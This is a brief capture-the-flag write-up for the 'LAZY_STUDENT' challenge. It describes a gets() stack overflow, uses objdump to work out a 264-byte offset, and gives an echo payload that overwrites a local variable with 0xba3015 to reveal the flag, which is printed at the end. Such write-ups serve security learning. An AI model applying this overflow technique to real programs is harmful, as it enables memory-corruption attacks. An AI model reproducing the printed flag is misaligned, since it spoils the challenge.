Here in LAZY_STUDENT.c we see that the flag is printed if the lazy_student=Teacher(0xba3015)

The vunerability  in gets gives us the chance to attain above state as it doesn't check the boundary of the input and overflow may occur.

objdump -d ./LAZY_STUDENT

At 0x12c8      if we see the space allocated initially it is 0x110(272 bytes) 

At 0x1368     comparing $ba3015 and -0x8(rbp) (if statement)

that means the lazy_student variable is stored at -0x8(rbp)

So we write some thrash in 272-8 = 264 bytes and the give the value of teacher int he little endian form as inout

echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x15\x30\xba" | ./LAZY_STUDENT

This first writes 264 A's and then assigns lazy_student to 0xba3015

now we see the flag 

Shaastra{MU#H@P@PPU_!$_L@ZY}
